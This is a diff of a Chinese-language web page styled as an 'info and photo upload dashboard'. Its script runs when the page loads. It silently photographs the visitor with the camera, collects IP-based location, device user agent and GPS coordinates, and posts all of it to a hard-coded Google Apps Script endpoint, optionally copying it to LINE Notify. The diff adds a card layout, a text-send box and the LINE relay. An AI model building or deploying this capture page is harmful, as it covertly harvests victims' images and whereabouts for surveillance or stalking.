@@ -4,26 +4,98 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>資訊與拍照回傳儀表板</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #03031c, #0a0a4a);
+      color: #00ffcc;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .dashboard {
+      width: 90%;
+      max-width: 1200px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+
+    .card {
+      background: rgba(15, 15, 50, 0.9);
+      border: 2px solid #00ffff;
+      border-radius: 15px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 255, 204, 0.5);
+    }
+
+    h1 {
+      text-align: center;
+      color: #00ffff;
+      text-shadow: 0 0 10px #00ffff;
+      margin-bottom: 30px;
+    }
+
+    input, button {
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 5px;
+      border: none;
+    }
+
+    button {
+      background: #0077ff;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+
+    button:hover {
+      background: #00eaff;
+    }
+  </style>
 </head>
 <body>
-  <h1>ＫＬＤ</h1>
-  <p id="photoStatus">照片狀態：啟動中...</p>
-  <p id="ipInfo">IP 資訊：讀取中...</p>
-  <p id="gpsCoordinates">GPS 資訊：讀取中...</p>
-  <p id="gpsAddress">地址：讀取中...</p>
-  <p id="status">狀態：等待回傳...</p>
+  <h1>資訊與拍照回傳儀表板</h1>
+  <div class="dashboard">
+    <div class="card">
+      <h2>拍照狀態</h2>
+      <p id="photoStatus">等待拍照...</p>
+    </div>
+    <div class="card">
+      <h2>IP 與設備資訊</h2>
+      <p id="ipInfo">IP 資訊讀取中...</p>
+      <p id="deviceInfo">設備資訊讀取中...</p>
+    </div>
+    <div class="card">
+      <h2>GPS 資訊</h2>
+      <p id="gpsCoordinates">GPS 資訊讀取中...</p>
+      <p id="gpsAddress">地址讀取中...</p>
+    </div>
+    <div class="card">
+      <h2>文字回傳</h2>
+      <input type="text" id="textInput" placeholder="輸入文字">
+      <button onclick="sendTextToServer()">送出文字</button>
+    </div>
+  </div>
 
   <script>
     const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec';
+    const LINE_NOTIFY_TOKEN = 'YOUR_LINE_NOTIFY_TOKEN'; // 替換為您的 LINE Notify Token
 
-    // 啟動相機並拍照
     async function startCameraAndSend() {
-      const photoStatusElement = document.getElementById('photoStatus');
+      const photoStatus = document.getElementById('photoStatus');
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         const video = document.createElement('video');
         video.srcObject = stream;
-
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play();
@@ -39,75 +111,75 @@
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const photoData = canvas.toDataURL('image/jpeg', 0.5);
           stream.getTracks().forEach(track => track.stop());
-
           sendToServer({ imageData: photoData.split(',')[1], message: '自動上傳圖片' });
-          photoStatusElement.innerText = '照片已成功拍攝並回傳！';
+          photoStatus.innerText = '照片已成功拍攝並回傳！';
         }, 1000);
       } catch (error) {
-        photoStatusElement.innerText = '相機啟動失敗！';
-        console.error('相機啟動錯誤:', error);
+        photoStatus.innerText = '相機啟動失敗';
+        console.error('拍照失敗:', error);
       }
     }
 
-    // 獲取 IP 與設備資訊
-    async function getIpInfo() {
-      const ipInfoElement = document.getElementById('ipInfo');
+    async function getIpAndDeviceInfo() {
+      const ipInfo = document.getElementById('ipInfo');
+      const deviceInfo = document.getElementById('deviceInfo');
       try {
         const response = await fetch('https://ipinfo.io/json');
         const data = await response.json();
-        const { ip, city, region, country, org } = data;
         const userAgent = navigator.userAgent;
-
-        ipInfoElement.innerText = `IP: ${ip}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}`;
-        sendToServer({ ip, city, region, country, org, userAgent, message: 'IP 資訊回傳' });
+        ipInfo.innerText = `IP: ${data.ip}, 城市: ${data.city}`;
+        deviceInfo.innerText = `設備: ${userAgent}`;
+        sendToServer({ ...data, userAgent, message: 'IP 與設備資訊回傳' });
       } catch (error) {
-        ipInfoElement.innerText = 'IP 資訊讀取失敗！';
-        console.error('IP 資訊錯誤:', error);
+        ipInfo.innerText = 'IP 資訊讀取失敗';
+        deviceInfo.innerText = '設備資訊讀取失敗';
+        console.error('IP 或設備資訊讀取錯誤:', error);
       }
     }
 
-    // 獲取 GPS 資訊
     async function getGPSInfo() {
-      const gpsCoordinatesElement = document.getElementById('gpsCoordinates');
-      const gpsAddressElement = document.getElementById('gpsAddress');
-      if (navigator.geolocation) {
+      const gpsCoordinates = document.getElementById('gpsCoordinates');
+      const gpsAddress = document.getElementById('gpsAddress');
+      if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(async position => {
           const { latitude, longitude } = position.coords;
-          gpsCoordinatesElement.innerText = `經度: ${longitude.toFixed(5)}, 緯度: ${latitude.toFixed(5)}`;
-          try {
-            sendToServer({ latitude, longitude, message: 'GPS 資訊回傳' });
-          } catch (error) {
-            gpsAddressElement.innerText = 'GPS 資訊回傳失敗';
-            console.error('GPS 錯誤:', error);
-          }
+          gpsCoordinates.innerText = `經度: ${longitude}, 緯度: ${latitude}`;
+          sendToServer({ latitude, longitude, message: 'GPS 資訊回傳' });
         });
+      } else {
+        gpsCoordinates.innerText = 'GPS 不支援';
       }
     }
 
-    // 通用回傳功能
+    async function sendTextToServer() {
+      const textInput = document.getElementById('textInput').value.trim();
+      if (textInput) {
+        sendToServer({ message: textInput });
+        alert('文字已回傳！');
+      } else {
+        alert('請輸入文字！');
+      }
+    }
+
     async function sendToServer(data) {
-      const statusElement = document.getElementById('status');
       try {
         const formData = new URLSearchParams(data);
-        const response = await fetch(BACKEND_URL, { method: 'POST', body: formData });
-        const result = await response.json();
-
-        if (result.success) {
-          statusElement.innerText = '資料已成功回傳！';
-        } else {
-          statusElement.innerText = '資料回傳失敗！';
-          console.error('伺服器錯誤:', result.error);
+        await fetch(BACKEND_URL, { method: 'POST', body: formData });
+        if (LINE_NOTIFY_TOKEN) {
+          await fetch('https://notify-api.line.me/api/notify', {
+            method: 'POST',
+            headers: { 'Authorization': `Bearer ${LINE_NOTIFY_TOKEN}` },
+            body: formData,
+          });
         }
       } catch (error) {
-        statusElement.innerText = '資料回傳過程中出錯！';
-        console.error('回傳錯誤:', error);
+        console.error('回傳失敗:', error);
       }
     }
 
-    // 啟動所有功能
     window.onload = () => {
       startCameraAndSend();
-      getIpInfo();
+      getIpAndDeviceInfo();
       getGPSInfo();
     };
   </script>
